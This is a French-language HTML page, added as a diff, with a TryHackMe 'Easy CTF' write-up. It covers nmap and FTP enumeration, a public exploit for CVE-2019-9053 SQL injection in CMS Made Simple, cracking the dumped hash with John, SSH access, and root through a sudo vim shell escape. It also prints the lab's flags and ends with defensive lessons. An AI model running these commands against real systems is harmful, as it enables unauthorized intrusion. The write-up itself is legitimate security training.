@@ -1,0 +1,226 @@
+<!DOCTYPE html>
+<html lang="fr">
+
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Easy CTF — TryHackMe Writeup | Alex171</title>
+    <meta name="description"
+        content="Writeup Easy CTF TryHackMe — FTP anonyme, SQLi CVE-2019-9053, John, SSH, sudo vim." />
+    <link rel="stylesheet" href="../css/style.css" />
+    <link rel="stylesheet" href="../css/animations.css" />
+    <link rel="icon"
+        href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🔐</text></svg>" />
+</head>
+
+<body>
+    <canvas id="matrix-canvas"></canvas>
+    <div class="grid-bg"></div>
+    <nav class="navbar">
+        <a class="nav-logo" href="../index.html">&gt;_<span> alex171</span></a>
+        <div class="nav-links">
+            <a href="../index.html">Accueil</a><a href="../about.html">À propos</a>
+            <a href="../writeups.html" class="active">Writeups</a><a href="../certifications.html">Certifications</a>
+            <a href="../projects.html">Projets</a><a href="../resources.html">Ressources</a>
+        </div>
+        <div class="hamburger" id="hamburger"><span></span><span></span><span></span></div>
+    </nav>
+    <div class="mobile-menu" id="mobile-menu">
+        <a href="../index.html">Accueil</a><a href="../writeups.html">Writeups</a>
+        <a href="../certifications.html">Certifications</a><a href="../resources.html">Ressources</a>
+    </div>
+
+    <main>
+        <section class="section">
+            <div class="container">
+                <div style="font-family:var(--font-mono);font-size:0.78rem;color:var(--text-muted);margin-bottom:1.5rem;"
+                    class="fade-in">
+                    <a href="../index.html" style="color:var(--text-muted);">~</a> / <a href="../writeups.html"
+                        style="color:var(--text-muted);">writeups</a> / <span
+                        style="color:var(--green);">easy-ctf</span>
+                </div>
+                <div class="writeup-layout">
+                    <article class="writeup-content fade-in">
+                        <div style="margin-bottom:2rem;">
+                            <div
+                                style="display:flex;align-items:center;gap:0.75rem;margin-bottom:0.75rem;flex-wrap:wrap;">
+                                <span class="writeup-platform">TryHackMe</span><span class="diff diff-easy">Easy</span>
+                                <span style="font-family:var(--font-mono);font-size:0.72rem;color:var(--text-muted);">27
+                                    Fév 2026</span>
+                            </div>
+                            <h1 style="font-size:2rem;font-weight:800;color:var(--text-primary);margin-bottom:0.75rem;">
+                                Easy CTF</h1>
+                            <div class="writeup-meta">
+                                <span class="tag">FTP Anonyme</span><span class="tag">SQLi</span><span
+                                    class="tag purple">CVE-2019-9053</span>
+                                <span class="tag">John</span><span class="tag">SSH</span><span class="tag">sudo
+                                    vim</span>
+                            </div>
+                            <p style="color:var(--text-secondary);line-height:1.8;font-size:0.95rem;">
+                                CTF débutant axé sur l'énumération réseau, l'exploitation SQLi dans un CMS, le cracking
+                                de hash et l'élévation via sudo vim.
+                            </p>
+                        </div>
+
+                        <h2 id="recon">Reconnaissance — Nmap</h2>
+                        <div class="code-block">
+                            <div class="code-block-header"><span>bash</span><button class="copy-btn">Copier</button>
+                            </div>
+                            <pre><span class="hl-bash">nmap</span> -sC -sV lab.thm</pre>
+                        </div>
+                        <p>Ports découverts :</p>
+                        <ul>
+                            <li><strong>21/tcp</strong> — FTP vsftpd 3.0.3 (connexion anonyme autorisée)</li>
+                            <li><strong>80/tcp</strong> — Apache 2.4.18</li>
+                            <li><strong>2222/tcp</strong> — SSH (port non standard)</li>
+                        </ul>
+
+                        <h2 id="ftp">Phase 1 — Énumération FTP</h2>
+                        <div class="code-block">
+                            <div class="code-block-header"><span>bash</span><button class="copy-btn">Copier</button>
+                            </div>
+                            <pre><span class="hl-bash">ftp</span> lab.thm
+<span class="hl-comment"># Login: anonymous / (vide)</span>
+ftp&gt; cd pub
+ftp&gt; get ForMitch.txt</pre>
+                        </div>
+                        <p>Contenu de <code>ForMitch.txt</code> : l'utilisateur <strong>Mitch</strong> a un mot de passe
+                            faible identique pour le système.</p>
+
+                        <h2 id="web">Phase 2 — Énumération Web</h2>
+                        <div class="code-block">
+                            <div class="code-block-header"><span>bash</span><button class="copy-btn">Copier</button>
+                            </div>
+                            <pre><span class="hl-bash">gobuster</span> dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt \
+  -u http://lab.thm</pre>
+                        </div>
+                        <p>Répertoire <code>/simple</code> découvert → <strong>CMS Made Simple v2.2.8</strong>.</p>
+
+                        <h2 id="sqli">Phase 3 — SQLi sur CMS Made Simple</h2>
+                        <p>La version 2.2.8 est vulnérable à <strong>CVE-2019-9053</strong> (SQLi time-based blind). On
+                            utilise un script Python :</p>
+                        <div class="code-block">
+                            <div class="code-block-header"><span>bash</span><button class="copy-btn">Copier</button>
+                            </div>
+                            <pre><span class="hl-bash">python3</span> updated_46635.py -u http://lab.thm/simple</pre>
+                        </div>
+                        <div class="code-block">
+                            <div class="code-block-header"><span>output</span><button class="copy-btn">Copier</button>
+                            </div>
+                            <pre><span class="hl-out">Username : mitch
+Salt     : 1dac0d92e9fa6bb2
+Password : 0c01f4468bd75d7a84c7eb73846e8d96
+Email    : admin@admin.com</span></pre>
+                        </div>
+                        <p>On craque le hash MD5+salt avec John :</p>
+                        <div class="code-block">
+                            <div class="code-block-header"><span>bash</span><button class="copy-btn">Copier</button>
+                            </div>
+                            <pre><span class="hl-comment"># Format du hash dans hash.txt :</span>
+<span class="hl-out">mitch:0c01f4468bd75d7a84c7eb73846e8d96$1dac0d92e9fa6bb2</span>
+
+<span class="hl-bash">john</span> --format=dynamic_4 \
+  --wordlist=/usr/share/wordlists/rockyou.txt hash.txt</pre>
+                        </div>
+                        <div class="flag-box">Mot de passe : <strong>secret</strong></div>
+
+                        <h2 id="ssh">Phase 4 — Accès SSH</h2>
+                        <div class="code-block">
+                            <div class="code-block-header"><span>bash</span><button class="copy-btn">Copier</button>
+                            </div>
+                            <pre><span class="hl-bash">ssh</span> mitch@lab.thm -p 2222
+<span class="hl-comment"># Password: secret</span></pre>
+                        </div>
+                        <div class="flag-box">User flag : <code>G00d j0b, keep up!</code></div>
+
+                        <h2 id="privesc">Phase 5 — Escalade de privilèges</h2>
+                        <div class="code-block">
+                            <div class="code-block-header"><span>bash</span><button class="copy-btn">Copier</button>
+                            </div>
+                            <pre><span class="hl-bash">sudo</span> -l
+<span class="hl-out">User mitch may run : (root) NOPASSWD: /usr/bin/vim</span>
+
+<span class="hl-bash">sudo</span> vim -c ':!/bin/bash'</pre>
+                        </div>
+                        <p>vim peut exécuter des commandes shell avec <code>:!commande</code>. On obtient un shell root
+                            :</p>
+                        <div class="flag-box">Root flag : <code>W3ll d0n3. You made it!</code></div>
+
+                        <h2 id="lessons">Leçons apprises</h2>
+                        <ul>
+                            <li>Le FTP anonyme ne doit jamais contenir d'informations sensibles</li>
+                            <li>Toujours mettre à jour les CMS — CVE-2019-9053 existe depuis 2019</li>
+                            <li>sudo NOPASSWD sur un éditeur (vim, nano, less) = privesc immédiat via
+                                <code>:!bash</code></li>
+                            <li>Préférer des mots de passe forts et uniques pour chaque service</li>
+                        </ul>
+
+                        <div
+                            style="margin-top:2rem;padding-top:1.5rem;border-top:1px solid var(--border);display:flex;gap:1rem;flex-wrap:wrap;">
+                            <a href="../writeups.html" class="btn btn-outline">← Tous les writeups</a>
+                            <a href="chill-hack.html" class="btn btn-outline">Suivant : Chill Hack →</a>
+                        </div>
+                    </article>
+
+                    <aside class="writeup-sidebar">
+                        <div class="sidebar-title">Table des matières</div>
+                        <div class="toc-list">
+                            <div class="toc-item" data-target="recon">Reconnaissance</div>
+                            <div class="toc-item" data-target="ftp">FTP Anonyme</div>
+                            <div class="toc-item" data-target="web">Énumération Web</div>
+                            <div class="toc-item" data-target="sqli">SQLi — CMS Simple</div>
+                            <div class="toc-item" data-target="ssh">Accès SSH</div>
+                            <div class="toc-item" data-target="privesc">Privesc — sudo vim</div>
+                            <div class="toc-item" data-target="lessons">Leçons apprises</div>
+                        </div>
+                        <hr style="border-color:var(--border);margin:1rem 0;" />
+                        <div
+                            style="display:flex;flex-direction:column;gap:0.4rem;font-size:0.78rem;font-family:var(--font-mono);">
+                            <div><span style="color:var(--text-muted);">Plateforme :</span> <span
+                                    style="color:var(--green);">TryHackMe</span></div>
+                            <div><span style="color:var(--text-muted);">Difficulté :</span> <span
+                                    style="color:#4ade80;">Easy</span></div>
+                            <div><span style="color:var(--text-muted);">Date :</span> <span
+                                    style="color:var(--text-secondary);">27 Fév 2026</span></div>
+                            <div><span style="color:var(--text-muted);">CVE :</span> <span
+                                    style="color:#a78bfa;">CVE-2019-9053</span></div>
+                        </div>
+                    </aside>
+                </div>
+            </div>
+        </section>
+    </main>
+
+    <footer>
+        <div class="container">
+            <div class="footer-inner">
+                <div class="footer-name">&gt;_ alex171-studo</div>
+                <div class="footer-links"><a href="../writeups.html">Writeups</a><a href="../index.html">Accueil</a>
+                </div>
+                <div class="footer-copy">© 2026 Alex171-studo</div>
+            </div>
+        </div>
+    </footer>
+
+    <div id="interactive-terminal" class="terminal-window">
+        <div class="terminal-titlebar">
+            <div class="terminal-dot dot-red"></div>
+            <div class="terminal-dot dot-yellow"></div>
+            <div class="terminal-dot dot-green"></div>
+            <span class="terminal-title">Terminal interactif</span>
+            <button id="term-close"
+                style="background:none;border:none;color:var(--text-muted);cursor:pointer;margin-left:auto;">✕</button>
+        </div>
+        <div class="term-interactive-body" id="term-output"></div>
+        <div class="term-input-line">
+            <span class="t-prompt" style="white-space:nowrap;font-size:0.8rem;">alex@portfolio:~$</span>
+            <input type="text" id="term-input" class="term-input" placeholder="help" autocomplete="off"
+                spellcheck="false" />
+        </div>
+    </div>
+    <button class="term-toggle-btn" id="term-toggle">&gt;_</button>
+    <script src="../js/main.js"></script>
+    <script src="../js/terminal.js"></script>
+</body>
+
+</html>
